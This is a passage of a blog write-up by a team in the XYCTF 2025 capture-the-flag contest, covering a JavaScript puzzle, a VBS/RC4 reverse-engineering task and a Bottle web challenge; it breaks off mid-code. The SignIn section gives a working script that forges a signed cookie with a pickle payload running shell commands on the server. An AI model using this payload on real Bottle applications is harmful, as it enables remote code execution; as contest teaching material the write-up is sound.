<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="不知道"><meta name="copyright" content="不知道"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>XYCTF25 不知道 WP | 不知道のblog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/unknown.jpg"><link rel="mask-icon" href="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/unknown.jpg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"example.com","root":"/","title":"不知道的小站","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="战队名：不知道排名：1  Webez_puzzle查看js源码，找到_3KH_函数判断输出flag的地方 12345if (G &gt; yw4) &#123;      alert(O[s74](J74))    &#125; else &#123;      alert($vfeRha_calc(S74 + G &#x2F; Rw4, Y74, $v5sNVR(vS4)))    &#125;  运行到">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF25 不知道 WP">
<meta property="og:url" content="http://example.com/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/index.html">
<meta property="og:site_name" content="不知道のblog">
<meta property="og:description" content="战队名：不知道排名：1  Webez_puzzle查看js源码，找到_3KH_函数判断输出flag的地方 12345if (G &gt; yw4) &#123;      alert(O[s74](J74))    &#125; else &#123;      alert($vfeRha_calc(S74 + G &#x2F; Rw4, Y74, $v5sNVR(vS4)))    &#125;  运行到">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/e859cd5cae823fc6e9ecd736647c7dab.png">
<meta property="og:image" content="http://example.com/image.png">
<meta property="og:image" content="http://example.com/image-20250406194123399.png">
<meta property="og:image" content="http://example.com/image-20250406200423921.png">
<meta property="og:image" content="http://example.com/.%5C1.png">
<meta property="og:image" content="http://example.com/.%5C2.png">
<meta property="og:image" content="http://example.com/.%5C4.png">
<meta property="og:image" content="http://example.com/.%5C5.png">
<meta property="og:image" content="http://example.com/.%5C6.png">
<meta property="og:image" content="http://example.com/.%5C7.png">
<meta property="og:image" content="http://example.com/.%5C8.png">
<meta property="og:image" content="http://example.com/.%5C9.png">
<meta property="og:image" content="http://example.com/.%5C10.png">
<meta property="og:image" content="http://example.com/.%5C11.png">
<meta property="og:image" content="http://example.com/.%5C12.png">
<meta property="og:image" content="http://example.com/.%5C13.png">
<meta property="og:image" content="http://example.com/.%5C14.png">
<meta property="og:image" content="http://example.com/.%5C15.png">
<meta property="og:image" content="http://example.com/.%5C16.png">
<meta property="og:image" content="http://example.com/.%5C17.png">
<meta property="og:image" content="http://example.com/.%5C18.png">
<meta property="og:image" content="http://example.com/.%5C31.png">
<meta property="og:image" content="http://example.com/.%5C19.png">
<meta property="og:image" content="http://example.com/.%5C20.png">
<meta property="og:image" content="http://example.com/.%5C21.png">
<meta property="og:image" content="http://example.com/.%5C22.png">
<meta property="og:image" content="http://example.com/.%5C23.png">
<meta property="og:image" content="http://example.com/.%5C24.png">
<meta property="og:image" content="http://example.com/.%5C25.png">
<meta property="og:image" content="http://example.com/.%5C26.png">
<meta property="og:image" content="http://example.com/.%5C27.png">
<meta property="og:image" content="http://example.com/.%5C28.png">
<meta property="og:image" content="http://example.com/.%5C29.png">
<meta property="og:image" content="http://example.com/.%5C30.png">
<meta property="og:image" content="http://example.com/.%5C32.png">
<meta property="og:image" content="http://example.com/.%5C33.png">
<meta property="og:image" content="http://example.com/.%5C34.png">
<meta property="og:image" content="http://example.com/.%5C35.png">
<meta property="og:image" content="http://example.com/.%5C36.png">
<meta property="og:image" content="http://example.com/.%5C37.png">
<meta property="og:image" content="http://example.com/.%5C38.png">
<meta property="og:image" content="http://example.com/.%5C39.png">
<meta property="og:image" content="http://example.com/.%5C40.png">
<meta property="og:image" content="http://example.com/.%5C41.png">
<meta property="og:image" content="http://example.com/.%5C42.png">
<meta property="og:image" content="http://example.com/.%5C43.png">
<meta property="og:image" content="http://example.com/.%5C44.png">
<meta property="og:image" content="http://example.com/.%5C45.png">
<meta property="og:image" content="http://example.com/.%5C46.png">
<meta property="og:image" content="http://example.com/.%5C47.png">
<meta property="og:image" content="http://example.com/.%5C48.png">
<meta property="og:image" content="http://example.com/.%5C49.png">
<meta property="og:image" content="http://example.com/.%5C50.png">
<meta property="og:image" content="http://example.com/.%5C51.png">
<meta property="og:image" content="http://example.com/.%5C52.png">
<meta property="og:image" content="http://example.com/.%5C53.png">
<meta property="og:image" content="http://example.com/.%5C54.png">
<meta property="og:image" content="http://example.com/.%5C55.png">
<meta property="og:image" content="http://example.com/.%5C56.png">
<meta property="og:image" content="http://example.com/.%5C57.png">
<meta property="og:image" content="http://example.com/.%5C58.png">
<meta property="og:image" content="http://example.com/.%5C59.png">
<meta property="og:image" content="http://example.com/.%5C60.png">
<meta property="og:image" content="http://example.com/.%5C61.png">
<meta property="og:image" content="http://example.com/download.jpg">
<meta property="og:image" content="http://example.com/EASY_1_decpy3.png">
<meta property="og:image" content="http://example.com/1743836629066-03a76683-7499-468d-85f3-3fb10439a989.png">
<meta property="og:image" content="http://example.com/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21.png">
<meta property="og:image" content="http://example.com/QQ_1743832187198.png">
<meta property="og:image" content="http://example.com/QQ_1743832241003.png">
<meta property="og:image" content="http://example.com/QQ_1743832317067.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/52464567/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717.png">
<meta property="og:image" content="http://example.com/QQ_1743832409731.png">
<meta property="og:image" content="http://example.com/QQ_1743832453654.png">
<meta property="og:image" content="http://example.com/QQ_1743832482740.png">
<meta property="article:published_time" content="2025-04-07T12:00:45.000Z">
<meta property="article:modified_time" content="2025-04-07T12:44:29.959Z">
<meta property="article:author" content="不知道">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/e859cd5cae823fc6e9ecd736647c7dab.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="不知道"><img width="96" loading="lazy" src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/unknown.jpg" alt="不知道"></a><div class="site-author-name"><a href="/about/">不知道</a></div><a class="site-name" href="/about/site.html">不知道のblog</a><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">1</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">0</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%98%E9%98%9F%E5%90%8D%EF%BC%9A%E4%B8%8D%E7%9F%A5%E9%81%93"><span class="toc-number">1.</span> <span class="toc-text">战队名：不知道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-puzzle"><span class="toc-number">1.1.1.</span> <span class="toc-text">ez_puzzle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SignIn"><span class="toc-number">1.1.2.</span> <span class="toc-text">SignIn</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WARMUP"><span class="toc-number">1.2.1.</span> <span class="toc-text">WARMUP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezVM"><span class="toc-number">1.2.2.</span> <span class="toc-text">ezVM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Moon"><span class="toc-number">1.2.3.</span> <span class="toc-text">Moon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dragon"><span class="toc-number">1.2.4.</span> <span class="toc-text">Dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Summer%EF%BC%885m10v3%E5%B8%88%E5%82%85%E8%A7%A3%E9%A2%98%EF%BC%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">Summer（5m10v3师傅解题）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lake"><span class="toc-number">1.2.6.</span> <span class="toc-text">Lake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzObf"><span class="toc-number">1.2.7.</span> <span class="toc-text">EzObf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrackMe"><span class="toc-number">1.2.8.</span> <span class="toc-text">CrackMe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Division"><span class="toc-number">1.3.1.</span> <span class="toc-text">Division</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Complex-signin"><span class="toc-number">1.3.2.</span> <span class="toc-text">Complex_signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92"><span class="toc-number">1.3.3.</span> <span class="toc-text">勒索病毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reed"><span class="toc-number">1.3.4.</span> <span class="toc-text">reed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#choice"><span class="toc-number">1.3.5.</span> <span class="toc-text">choice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E5%A4%8D%E5%A4%8D%E5%A4%8D%E6%95%B0"><span class="toc-number">1.3.6.</span> <span class="toc-text">复复复复数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ret2libc%E2%80%99s-Revenge"><span class="toc-number">1.4.1.</span> <span class="toc-text">Ret2libc’s Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E8%8B%A6%E6%89%8B"><span class="toc-number">1.4.2.</span> <span class="toc-text">web苦手</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#girlfriend"><span class="toc-number">1.4.3.</span> <span class="toc-text">girlfriend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%97%A5%E6%96%B9%E8%88%9F%E5%AF%BB%E8%AE%BF%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="toc-number">1.4.4.</span> <span class="toc-text">明日方舟寻访模拟器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-3-0"><span class="toc-number">1.4.5.</span> <span class="toc-text">EZ 3.0</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7"><span class="toc-number">1.5.1.</span> <span class="toc-text">签个到吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.5.2.</span> <span class="toc-text">&lt;曼波曼波曼波</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MADer%E4%B9%9F%E8%A6%81%E5%BD%93CTFer"><span class="toc-number">1.5.3.</span> <span class="toc-text">MADer也要当CTFer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E9%A3%9E%E7%9A%84%E9%9B%B7%E5%85%8B%E8%90%A8%E6%96%AF"><span class="toc-number">1.5.4.</span> <span class="toc-text">会飞的雷克萨斯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XGCTF"><span class="toc-number">1.5.5.</span> <span class="toc-text">XGCTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Greedymen"><span class="toc-number">1.5.6.</span> <span class="toc-text">Greedymen</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://example.com/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="不知道"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="不知道のblog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">XYCTF25 不知道 WP</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2025-04-07 20:00:45" itemprop="dateCreated datePublished" datetime="2025-04-07T20:00:45+08:00">2025-04-07</time></div><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="战队名：不知道"><a href="#战队名：不知道" class="headerlink" title="战队名：不知道"></a>战队名：不知道</h1><p><strong>排名</strong>：<strong>1</strong></p>
<p><img src="/e859cd5cae823fc6e9ecd736647c7dab.png" loading="lazy"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h3><p>查看js源码，找到_3KH_函数判断输出flag的地方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (G &gt; yw4) &#123;</span><br><span class="line">      alert(O[s74](J74))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      alert($vfeRha_calc(S74 + G / Rw4, Y74, $v5sNVR(vS4)))</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行到此处即可</p>
<p><img src="/image.png" loading="lazy"></p>
<h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p>访问&#x2F;secret 获得cookie </p>
<p>疑似Bottle 框架的 signed cookie</p>
<p>signed cookie 构造</p>
<p><code>!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=</code>是 base 64 编码的   HMAC - SHA 1 签名</p>
<p><code>gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu</code>是 base64 编码的 Python 数据，反序列化后应该是</p>
<p>也就是说第二端可以通过pickle 序列化攻击实现 rce</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from bottle import SimpleCookie</span><br><span class="line">import base64</span><br><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">def make_signed_cookie(secret, data):</span><br><span class="line">    pickled = pickle.dumps(data)</span><br><span class="line">    digest = hmac.new(secret.encode(), pickled, hashlib.sha1).digest()</span><br><span class="line">    cookie = &#x27;!&#x27; + base64.b64encode(digest).decode() + &#x27;?&#x27; + base64.b64encode(pickled).decode()</span><br><span class="line">    return cookie</span><br><span class="line"></span><br><span class="line"># 假设你已经拿到 secret 内容：</span><br><span class="line">secret = &quot;&quot;  # ← 替换成实际值</span><br><span class="line">data = &#123;&quot;name&quot;: &quot;admin&quot;&#125;</span><br><span class="line">signed_cookie = make_signed_cookie(secret, data)</span><br><span class="line">print(&quot;伪造的 Cookie 值：&quot;, signed_cookie)</span><br></pre></td></tr></table></figure>

<p>通过&#x2F;download 读取 签名</p>
<p><img src="/image-20250406194123399.png" loading="lazy"></p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hell0_H@cker_Y0u_A3r_Sm@r7</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from bottle import SimpleCookie</span><br><span class="line">import base64</span><br><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">def make_signed_cookie(secret, data):</span><br><span class="line">    pickled = pickle.dumps(data)</span><br><span class="line">    digest = hmac.new(secret.encode(), pickled, hashlib.sha1).digest()</span><br><span class="line">    cookie = &#x27;!&#x27; + base64.b64encode(digest).decode() + &#x27;?&#x27; + base64.b64encode(pickled).decode()</span><br><span class="line">    return cookie</span><br><span class="line"></span><br><span class="line">secret = &quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;  </span><br><span class="line">class Data(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">         </span><br><span class="line">        return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag*&gt;/test.txt&#x27;).read()&quot;,))</span><br><span class="line">data = Data()</span><br><span class="line">encoded = base64.b64encode(pickle.dumps(data, -1))</span><br><span class="line">print(encoded)</span><br><span class="line">signed_cookie = make_signed_cookie(secret, data)</span><br><span class="line">print(&quot;伪造的 Cookie 值：&quot;, signed_cookie)</span><br></pre></td></tr></table></figure>

<p>伪造cookie成功后再通过download 路由实现任意文件读取</p>
<p><img src="/image-20250406200423921.png" loading="lazy"></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h3><p>网上抄的VBS解密代码</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> Defuscator(vbs)</span><br><span class="line">    <span class="keyword">Dim</span> t</span><br><span class="line">    t = InStr(<span class="number">1</span>, vbs, <span class="string">&quot;Execute&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    t = <span class="keyword">Mid</span>(vbs, t + Len(<span class="string">&quot;Execute&quot;</span>))</span><br><span class="line">    t = Eval(t)</span><br><span class="line">    Defuscator = t</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> fso, i, outFile</span><br><span class="line"><span class="keyword">Const</span> ForReading = <span class="number">1</span>, ForWriting = <span class="number">2</span></span><br><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; 创建或打开一个文件用于写入输出</span></span><br><span class="line">    <span class="keyword">Set</span> outFile = fso.OpenTextFile(<span class="string">&quot;output.txt&quot;</span>, ForWriting, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> WScript.Arguments.Count - <span class="number">1</span></span><br><span class="line">        <span class="keyword">Dim</span> FileName</span><br><span class="line">        FileName = WScript.Arguments(i)</span><br><span class="line">        <span class="keyword">Dim</span> MyFile</span><br><span class="line">        <span class="keyword">Set</span> MyFile = fso.OpenTextFile(FileName, ForReading)</span><br><span class="line">            <span class="keyword">Dim</span> vbs</span><br><span class="line">            vbs = MyFile.ReadAll</span><br><span class="line">            outFile.WriteLine Defuscator(vbs)</span><br><span class="line">            MyFile.Close</span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">        outFile.Close</span><br><span class="line">        <span class="keyword">Set</span> fso = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure>

<p>output.txt:</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span></span><br><span class="line">flag = InputBox(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;XYCTF&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span> <span class="comment">&#x27; 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級</span></span><br><span class="line">qwfe = <span class="string">&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; 淇鍚庣殑RC4鍔犲瘑鍑芥暟</span></span><br><span class="line"><span class="keyword">Function</span> RunRC(sMessage, strKey)</span><br><span class="line">    <span class="keyword">Dim</span> kLen, i, j, temp, pos, outHex</span><br><span class="line">    <span class="keyword">Dim</span> s(<span class="number">255</span>), k(<span class="number">255</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 鍒濆鍖栧瘑閽?</span></span><br><span class="line">    kLen = Len(strKey)</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = Asc(<span class="keyword">Mid</span>(strKey, (i <span class="built_in">Mod</span> kLen) + <span class="number">1</span>, <span class="number">1</span>)) <span class="comment">&#x27; 瀵嗛挜浣跨敤ASCII缂栫爜</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; KSA瀵嗛挜璋冨害</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        j = (j + s(i) + k(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; PRGA鍔犲瘑娴佺▼</span></span><br><span class="line">    i = <span class="number">0</span> : j = <span class="number">0</span> : outHex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">For</span> pos = <span class="number">1</span> <span class="keyword">To</span> Len(sMessage)</span><br><span class="line">        i = (i + <span class="number">1</span>) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        j = (j + s(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">        </span><br><span class="line">        <span class="comment">&#x27; 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?</span></span><br><span class="line">        <span class="keyword">Dim</span> plainChar, cipherByte</span><br><span class="line">        plainChar = Asc(<span class="keyword">Mid</span>(sMessage, pos, <span class="number">1</span>)) <span class="comment">&#x27; 